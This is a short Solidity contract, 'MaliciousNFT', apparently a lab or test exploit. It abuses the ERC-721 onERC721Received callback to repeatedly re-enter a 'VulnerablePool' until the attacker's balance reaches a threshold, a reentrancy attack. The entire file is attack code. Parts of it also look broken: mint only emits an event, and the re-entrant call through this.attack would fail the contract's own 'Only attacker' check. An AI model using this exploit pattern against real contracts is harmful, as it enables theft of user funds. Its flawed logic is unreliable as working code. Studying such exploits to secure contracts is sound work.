// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC721.sol";
import "./VulnerablePool.sol";

contract MaliciousNFT is IERC721Receiver {
    address public attacker;
    address public vulnerablePool;

    constructor(address _vulnerablePool) {
        attacker = msg.sender;
        vulnerablePool = _vulnerablePool;
    }

    function mint(address to, uint256 tokenId) external {
        emit Transfer(address(0), to, tokenId);
    }

    function attack(address nftAddress, uint256 tokenId) external {
        require(msg.sender == attacker, "Only attacker can call");
        IERC721(nftAddress).safeTransferFrom(attacker, vulnerablePool, tokenId);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        VulnerablePool pool = VulnerablePool(vulnerablePool);

        if (pool.balances(attacker) < 3e18) {
            this.attack(msg.sender, tokenId);
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
}